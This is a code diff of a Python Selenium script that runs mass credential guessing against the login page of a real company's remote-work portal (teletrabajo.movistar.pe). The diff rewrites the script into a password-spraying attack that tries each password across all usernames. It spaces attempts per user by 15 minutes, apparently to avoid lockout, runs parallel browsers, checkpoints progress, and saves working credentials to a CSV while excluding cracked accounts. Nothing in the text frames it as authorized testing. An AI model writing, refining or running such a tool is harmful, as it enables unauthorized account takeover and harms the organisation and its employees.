@@ -32,12 +32,15 @@ init(autoreset=True)
 # URL del login
 URL = "https://teletrabajo.movistar.pe"
 
-# Locks para escritura segura
+# Locks para sincronización
 file_lock = threading.Lock()
 tiempo_lock = threading.Lock()
+usuarios_lock = threading.Lock()
 
-# Diccionario para rastrear último uso de cada usuario (con lock)
+# Estructuras de datos compartidas
 ultimo_uso_usuario = defaultdict(lambda: datetime.min)
+usuarios_exitosos = set()  # Usuarios que ya tuvieron login exitoso
+usuarios_disponibles = []  # Cola de usuarios disponibles para probar
 
 def log_info(mensaje):
     """Log con info"""
@@ -126,6 +129,18 @@ def cargar_datos():
     
     return usuarios_df, passwords_df
 
+def cargar_usuarios_exitosos():
+    """Cargar usuarios que ya tuvieron login exitoso"""
+    try:
+        if os.path.exists("loginExitoso.csv"):
+            df = pd.read_csv("loginExitoso.csv")
+            usuarios = set(df['usuario'].unique())
+            log_info(f"📂 Cargados {len(usuarios)} usuarios con login exitoso previo (serán excluidos)")
+            return usuarios
+    except Exception as e:
+        log_warning(f"No se pudieron cargar usuarios exitosos previos: {e}")
+    return set()
+
 def configurar_driver():
     """Configurar navegador Chrome optimizado"""
     options = webdriver.ChromeOptions()
@@ -168,22 +183,59 @@ def configurar_driver():
         log_error(f"Error configurando navegador: {e}")
         return None
 
-def esperar_tiempo_minimo(usuario):
-    """Esperar 15 minutos desde el último uso del usuario"""
-    with tiempo_lock:
+def obtener_siguiente_usuario(password_idx):
+    """Obtener el siguiente usuario disponible (que haya pasado 15 min y no sea exitoso)"""
+    global usuarios_disponibles
+    
+    with usuarios_lock:
         ahora = datetime.now()
-        ultimo_uso = ultimo_uso_usuario[usuario]
-        tiempo_transcurrido = (ahora - ultimo_uso).total_seconds()
-        tiempo_espera = 900  # 15 minutos en segundos
+        tiempo_minimo = timedelta(minutes=15)
         
-        if tiempo_transcurrido < tiempo_espera:
-            tiempo_restante = tiempo_espera - tiempo_transcurrido
-            log_warning(f"⏳ Usuario '{usuario}' usado hace {int(tiempo_transcurrido/60)} min. Esperando {int(tiempo_restante/60)} min más...")
-            time.sleep(tiempo_restante)
+        # Buscar usuario disponible
+        for i, usuario in enumerate(usuarios_disponibles):
+            # Verificar si ya fue exitoso
+            if usuario in usuarios_exitosos:
+                continue
+            
+            # Verificar tiempo transcurrido
+            ultimo_uso = ultimo_uso_usuario[usuario]
+            tiempo_transcurrido = ahora - ultimo_uso
+            
+            if tiempo_transcurrido >= tiempo_minimo:
+                # Actualizar último uso
+                ultimo_uso_usuario[usuario] = ahora
+                log_info(f"✓ Usuario '{usuario}' seleccionado para password #{password_idx + 1}")
+                return usuario
         
-        # Actualizar último uso
-        ultimo_uso_usuario[usuario] = datetime.now()
-        log_info(f"✓ Usuario '{usuario}' listo para usar")
+        # Si no hay ninguno disponible, esperar al más próximo
+        log_warning(f"⏳ Todos los usuarios usados recientemente, esperando...")
+        
+        # Encontrar el usuario con menor tiempo de espera
+        min_espera = float('inf')
+        for usuario in usuarios_disponibles:
+            if usuario in usuarios_exitosos:
+                continue
+            
+            ultimo_uso = ultimo_uso_usuario[usuario]
+            tiempo_transcurrido = ahora - ultimo_uso
+            tiempo_restante = (tiempo_minimo - tiempo_transcurrido).total_seconds()
+            
+            if tiempo_restante < min_espera and tiempo_restante > 0:
+                min_espera = tiempo_restante
+        
+        if min_espera > 0 and min_espera < float('inf'):
+            log_warning(f"⏳ Esperando {int(min_espera/60)} minutos...")
+            time.sleep(min_espera)
+            return obtener_siguiente_usuario(password_idx)
+        
+        return None
+
+def marcar_usuario_exitoso(usuario):
+    """Marcar usuario como exitoso y excluirlo de futuras pruebas"""
+    with usuarios_lock:
+        usuarios_exitosos.add(usuario)
+        log_success(f"🎯 Usuario '{usuario}' marcado como EXITOSO - Excluido de futuras pruebas")
+        log_info(f"📊 Total usuarios exitosos hasta ahora: {len(usuarios_exitosos)}")
 
 def intentar_login(driver, wait, usuario, password):
     """Intentar login y verificar resultado"""
@@ -263,11 +315,13 @@ def intentar_login(driver, wait, usuario, password):
         # Si no hay errores y la URL cambió, es exitoso
         if url_actual != URL and "login" not in url_actual.lower():
             log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva URL: {url_actual}")
+            marcar_usuario_exitoso(usuario)
             return "EXITOSO"
         
         # Verificar ventanas/pestañas nuevas
         if len(driver.window_handles) > 1:
             log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva pestaña detectada")
+            marcar_usuario_exitoso(usuario)
             return "EXITOSO"
         
         # Verificar elementos de sesión iniciada
@@ -284,12 +338,14 @@ def intentar_login(driver, wait, usuario, password):
                 elementos = driver.find_elements(By.XPATH, selector)
                 if elementos and any(e.is_displayed() for e in elementos):
                     log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Indicador de sesión detectado")
+                    marcar_usuario_exitoso(usuario)
                     return "EXITOSO"
             except:
                 continue
         
         # Si no se detectó nada claro después de 4 segundos, considerar exitoso
         log_success(f"✅ LOGIN EXITOSO (sin error detectado): Usuario='{usuario}' | Password='{password}'")
+        marcar_usuario_exitoso(usuario)
         return "EXITOSO"
         
     except Exception as e:
@@ -326,12 +382,13 @@ def guardar_resultado(usuario, password, resultado):
     except Exception as e:
         log_error(f"Error guardando resultado: {e}")
 
-def guardar_checkpoint(indice_usuario, indice_password):
+def guardar_checkpoint(password_idx):
     """Guardar checkpoint del progreso"""
     try:
-        with open("checkpoint.txt", "w") as f:
-            f.write(f"{indice_usuario},{indice_password}")
-        log_info(f"💾 Checkpoint guardado: Usuario #{indice_usuario}, Password #{indice_password}")
+        with file_lock:
+            with open("checkpoint.txt", "w") as f:
+                f.write(f"{password_idx}")
+            log_info(f"💾 Checkpoint guardado: Password #{password_idx}")
     except Exception as e:
         log_error(f"Error guardando checkpoint: {e}")
 
@@ -342,34 +399,53 @@ def cargar_checkpoint():
             with open("checkpoint.txt", "r") as f:
                 contenido = f.read().strip()
                 if contenido:
-                    idx_usuario, idx_password = map(int, contenido.split(','))
-                    log_info(f"📂 Checkpoint cargado: Usuario #{idx_usuario}, Password #{idx_password}")
-                    return idx_usuario, idx_password
+                    password_idx = int(contenido)
+                    log_info(f"📂 Checkpoint cargado: Continuando desde Password #{password_idx}")
+                    return password_idx
     except Exception as e:
         log_warning(f"No se pudo cargar checkpoint: {e}")
-    return 0, 0
+    return 0
 
 def procesar_combinacion(args):
-    """Procesar una combinación usuario-password"""
-    idx_usuario, idx_password, usuario, password, total_usuarios, total_passwords = args
+    """Procesar una combinación usuario-password específica"""
+    usuario_idx, password_idx, usuario, password, total_usuarios, total_passwords = args
     
     driver = None
     try:
+        # Verificar si el usuario ya fue exitoso
+        with usuarios_lock:
+            if usuario in usuarios_exitosos:
+                log_warning(f"⏭️ Usuario '{usuario}' ya fue exitoso anteriormente - SALTANDO")
+                return (usuario_idx, password_idx, usuario, password, "SALTADO")
+        
         log_info(f"\n{'='*70}")
-        log_info(f"🔄 PROCESANDO COMBINACIÓN #{idx_usuario * total_passwords + idx_password + 1}")
-        log_info(f"   Usuario: {usuario} (#{idx_usuario + 1}/{total_usuarios})")
-        log_info(f"   Password: {password} (#{idx_password + 1}/{total_passwords})")
+        log_info(f"🔄 PROCESANDO COMBINACIÓN")
+        log_info(f"   Usuario: {usuario} (#{usuario_idx + 1}/{total_usuarios})")
+        log_info(f"   Password: {password} (#{password_idx + 1}/{total_passwords})")
+        log_info(f"   Usuarios exitosos acumulados: {len(usuarios_exitosos)}")
         log_info(f"{'='*70}")
         
-        # Esperar tiempo mínimo entre usos del mismo usuario
-        esperar_tiempo_minimo(usuario)
+        # Esperar tiempo mínimo si es necesario
+        with tiempo_lock:
+            ahora = datetime.now()
+            ultimo_uso = ultimo_uso_usuario[usuario]
+            tiempo_transcurrido = (ahora - ultimo_uso).total_seconds()
+            tiempo_espera = 900  # 15 minutos
+            
+            if tiempo_transcurrido < tiempo_espera:
+                tiempo_restante = tiempo_espera - tiempo_transcurrido
+                log_warning(f"⏳ Usuario '{usuario}' usado hace {int(tiempo_transcurrido/60)} min. Esperando {int(tiempo_restante/60)} min...")
+                time.sleep(tiempo_restante)
+            
+            # Actualizar último uso
+            ultimo_uso_usuario[usuario] = datetime.now()
         
         # Crear driver
         log_info("🔧 Configurando navegador...")
         driver = configurar_driver()
         if driver is None:
             log_error("❌ No se pudo configurar el navegador")
-            return (idx_usuario, idx_password, usuario, password, "ERROR")
+            return (usuario_idx, password_idx, usuario, password, "ERROR")
         
         wait = WebDriverWait(driver, 15)
         
@@ -380,14 +456,15 @@ def procesar_combinacion(args):
         guardar_resultado(usuario, password, resultado)
         
         # Guardar checkpoint cada 10 combinaciones
-        if (idx_usuario * total_passwords + idx_password) % 10 == 0:
-            guardar_checkpoint(idx_usuario, idx_password)
+        combinacion_num = usuario_idx * total_passwords + password_idx
+        if combinacion_num % 10 == 0:
+            guardar_checkpoint(password_idx)
         
-        return (idx_usuario, idx_password, usuario, password, resultado)
+        return (usuario_idx, password_idx, usuario, password, resultado)
         
     except Exception as e:
-        log_error(f"❌ Error procesando: Usuario='{usuario}', Password='{password}' | Error: {e}")
-        return (idx_usuario, idx_password, usuario, password, "ERROR")
+        log_error(f"❌ Error procesando: Usuario='{usuario}' Password='{password}' | Error: {e}")
+        return (usuario_idx, password_idx, usuario, password, "ERROR")
     finally:
         if driver:
             try:
@@ -398,9 +475,11 @@ def procesar_combinacion(args):
 
 def main():
     """Función principal"""
+    global usuarios_disponibles, usuarios_exitosos
+    
     log_info("="*70)
     log_info("🚀 VALIDADOR MASIVO DE CREDENCIALES - TELETRABAJO MOVISTAR")
-    log_info("⚡ Modo: Multi-threading con rotación de usuarios")
+    log_info("⚡ Modo OPTIMIZADO: Rotación inteligente + Exclusión automática")
     log_info("="*70)
     log_info(f"📅 Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     
@@ -409,68 +488,88 @@ def main():
     if usuarios_df is None or passwords_df is None:
         return
     
-    usuarios = usuarios_df['usuario'].tolist()
+    # Cargar usuarios exitosos previos
+    usuarios_exitosos = cargar_usuarios_exitosos()
+    
+    # Inicializar lista de usuarios disponibles
+    todos_usuarios = usuarios_df['usuario'].tolist()
+    usuarios_disponibles = [u for u in todos_usuarios if u not in usuarios_exitosos]
+    
     passwords = passwords_df['password'].tolist()
     
-    total_usuarios = len(usuarios)
+    total_usuarios_inicial = len(todos_usuarios)
+    total_usuarios_activos = len(usuarios_disponibles)
     total_passwords = len(passwords)
-    total_combinaciones = total_usuarios * total_passwords
     
     log_info(f"\n📊 ESTADÍSTICAS:")
-    log_info(f"   👥 Usuarios: {total_usuarios:,}")
+    log_info(f"   👥 Total usuarios: {total_usuarios_inicial:,}")
+    log_info(f"   ✅ Usuarios ya exitosos (excluidos): {len(usuarios_exitosos)}")
+    log_info(f"   🔄 Usuarios activos para probar: {total_usuarios_activos:,}")
     log_info(f"   🔑 Contraseñas: {total_passwords}")
-    log_info(f"   🔢 Total combinaciones: {total_combinaciones:,}")
-    log_info(f"   ⏱️ Tiempo mínimo entre usos del mismo usuario: 15 minutos")
+    log_info(f"   ⏱️ Tiempo mínimo entre usos: 15 minutos")
+    log_info(f"\n🎯 ESTRATEGIA:")
+    log_info(f"   1. Usuario1 + Password1")
+    log_info(f"   2. Usuario2 + Password1")
+    log_info(f"   3. Usuario3 + Password1")
+    log_info(f"   4. ... (todos los usuarios con Password1)")
+    log_info(f"   5. Usuario1 + Password2 (si pasaron 15 min)")
+    log_info(f"   6. Si usuario es EXITOSO → se EXCLUYE automáticamente")
+    
+    if total_usuarios_activos == 0:
+        log_success("🎉 ¡Todos los usuarios ya tienen login exitoso!")
+        return
     
     # Configuración
     NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores en paralelo? (recomendado 3-5): ") or "3")
     log_info(f"🔀 Configurado para usar {NUM_THREADS} navegadores en paralelo")
     
     # Cargar checkpoint
-    inicio_usuario, inicio_password = cargar_checkpoint()
-    if inicio_usuario > 0 or inicio_password > 0:
-        respuesta = input(f"\n⚠️ Checkpoint encontrado (Usuario #{inicio_usuario}, Password #{inicio_password}). ¿Continuar? (s/n): ")
+    inicio_password = cargar_checkpoint()
+    if inicio_password > 0:
+        respuesta = input(f"\n⚠️ Checkpoint encontrado (Password #{inicio_password}). ¿Continuar? (s/n): ")
         if respuesta.lower() != 's':
-            inicio_usuario, inicio_password = 0, 0
+            inicio_password = 0
     
-    # Preparar tareas
-    log_info("\n🎯 Preparando combinaciones...")
+    # Preparar tareas (todas las combinaciones siguiendo la estrategia)
+    log_info("\n🎯 Preparando todas las combinaciones...")
     tareas = []
     
-    for idx_u, usuario in enumerate(usuarios):
-        if idx_u < inicio_usuario:
-            continue
-        
-        for idx_p, password in enumerate(passwords):
-            if idx_u == inicio_usuario and idx_p < inicio_password:
-                continue
-            
-            tareas.append((idx_u, idx_p, usuario, password, total_usuarios, total_passwords))
+    # Estrategia: Password1 con todos los usuarios, luego Password2 con todos, etc.
+    for idx_p, password in enumerate(passwords):
+        for idx_u, usuario in enumerate(usuarios_disponibles):
+            # Solo agregar si el usuario no está en exitosos
+            if usuario not in usuarios_exitosos:
+                tareas.append((idx_u, idx_p, usuario, password, total_usuarios_activos, total_passwords))
     
-    log_info(f"✅ {len(tareas):,} combinaciones preparadas para procesar")
+    total_combinaciones = len(tareas)
+    log_info(f"✅ {total_combinaciones:,} combinaciones preparadas")
+    log_info(f"   ({total_usuarios_activos:,} usuarios × {total_passwords} contraseñas)")
     
     # Estadísticas
     exitosos = 0
     incorrectos = 0
     errores = 0
+    saltados = 0
     
     try:
         log_info(f"\n🏁 INICIANDO PROCESAMIENTO PARALELO")
-        log_info(f"⏱️ Tiempo estimado: ~{(len(tareas) * 8) / NUM_THREADS / 3600:.1f} horas\n")
+        log_info(f"⏱️ Tiempo estimado: ~{(total_combinaciones * 8) / NUM_THREADS / 3600:.1f} horas\n")
         
         with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
             futures = {executor.submit(procesar_combinacion, tarea): tarea for tarea in tareas}
             
-            with tqdm(total=len(tareas), desc="🔄 Progreso", unit="comb") as pbar:
+            with tqdm(total=total_combinaciones, desc="🔄 Progreso", unit="comb") as pbar:
                 for future in as_completed(futures):
                     try:
-                        idx_u, idx_p, usuario, password, resultado = future.result()
+                        usuario_idx, password_idx, usuario, password, resultado = future.result()
                         
                         if resultado == "EXITOSO":
                             exitosos += 1
                             tqdm.write(Fore.GREEN + f"✅ EXITOSO: {usuario} | {password}")
                         elif resultado == "INCORRECTO":
                             incorrectos += 1
+                        elif resultado == "SALTADO":
+                            saltados += 1
                         else:
                             errores += 1
                         
@@ -478,6 +577,7 @@ def main():
                         pbar.set_postfix({
                             'Exitosos': exitosos,
                             'Incorrectos': incorrectos,
+                            'Saltados': saltados,
                             'Errores': errores
                         })
                         
@@ -489,14 +589,16 @@ def main():
         log_info("\n" + "="*70)
         log_info("📊 RESUMEN FINAL")
         log_info("="*70)
-        log_info(f"✅ Exitosos: {exitosos}")
-        log_info(f"❌ Incorrectos: {incorrectos}")
+        log_info(f"✅ Logins exitosos: {exitosos}")
+        log_info(f"❌ Logins incorrectos: {incorrectos}")
+        log_info(f"⏭️ Combinaciones saltadas (usuario ya exitoso): {saltados}")
         log_info(f"⚠️ Errores: {errores}")
-        log_info(f"📈 Total procesado: {exitosos + incorrectos + errores}")
+        log_info(f"🎯 Total usuarios con credenciales válidas: {len(usuarios_exitosos)}")
+        log_info(f"📈 Total procesado: {exitosos + incorrectos + saltados + errores}")
         log_info(f"📁 Resultados guardados en:")
-        log_info(f"   - loginExitoso.csv")
+        log_info(f"   - loginExitoso.csv ({len(usuarios_exitosos)} usuarios)")
         log_info(f"   - loginIncorrecto.csv")
-        log_info(f"   - log.txt")
+        log_info(f"   - log.txt (log completo)")
         log_info(f"📅 Finalizado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         
         # Limpiar checkpoint
